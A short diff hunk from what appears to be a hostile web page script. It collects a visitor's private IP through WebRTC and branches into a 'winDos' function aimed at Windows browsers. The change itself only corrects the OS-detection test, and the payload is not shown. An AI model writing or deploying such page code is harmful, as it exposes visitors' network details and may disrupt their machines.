@@ -91,7 +91,7 @@ if (RTCPeerConnection) (function () {
           history.pushState(0,0, total );
       }
   }
-  if(OS.match('Win')>0) {
+  if(OS.match('Win')[0]=='Win') {
     var x = new Image();
     privip = document.getElementById("list").innerHTML.split(' ')[0];
     function winDos() {
